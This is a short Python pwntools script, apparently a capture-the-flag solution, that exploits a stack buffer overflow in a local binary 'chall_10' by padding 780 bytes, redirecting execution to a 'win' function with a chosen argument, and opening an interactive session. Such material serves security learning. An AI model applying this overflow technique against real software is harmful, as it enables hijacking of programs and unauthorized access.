# coding: utf-8
from pwn import *
elf=ELF("./chall_10")
p=process("./chall_10")
p.recv()
payload = b"A"*780 + p32(elf.sym.win) + b"AAAA" + p32(0x1a55fac3)
p.sendline(payload)
p.interactive()
